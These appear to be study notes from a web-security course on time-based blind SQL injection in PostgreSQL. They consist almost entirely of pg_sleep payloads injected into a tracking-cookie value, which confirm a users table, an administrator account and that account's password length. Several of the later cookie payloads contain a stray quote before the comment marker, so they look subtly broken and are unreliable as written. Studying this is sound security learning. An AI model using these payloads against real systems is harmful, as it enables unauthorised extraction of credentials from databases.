# Section 15: Time-Based Blind SQL injection

## Discovering Time-Based Blind SQLi

When there is no visible change in the web page for truthy or falsy sql injection statement, there is still a way to discover if an SQL statement
is executed by running a sleep function and checking the reponse time of the request

**Example**: Inject sleep in a request cookie

In a PostgreSQL DB engine:

```
Tracking Id: 0uHDsxyyjWVUzvKC'||pg_sleep(10)--
```

can test multiple sleep seconds to verify

---

## Extracting Data From the Database Using a Time-Based Blind SQLi

Confirm true statements with **conditional time delays**:

```
SELECT
  CASE
    WHEN (2=2) THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
```

Should take 10 seconds to load:

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)'--
```

Should load quickly because the condition is false:

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (2=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)'--
```

### Extracting Data

If we have a table that is called users, will sleep for 10 seconds

```
SELECT
  CASE
    WHEN (2=2) THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
FROM users
```



```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```

Check if an administrator user exists:

```
SELECT
  CASE
    WHEN (username='administrator') THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
FROM users
```

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```

Check password length of administrator:

```
SELECT
  CASE
    WHEN (username='administrator') AND LENGTH (password)>1 THEN
      pg_sleep(10)
    ELSE
      pg_sleep(0)
  END
FROM users
```

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```

```
Tracking Id: 0uHDsxyyjWVUzvKC'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)'--
```



---



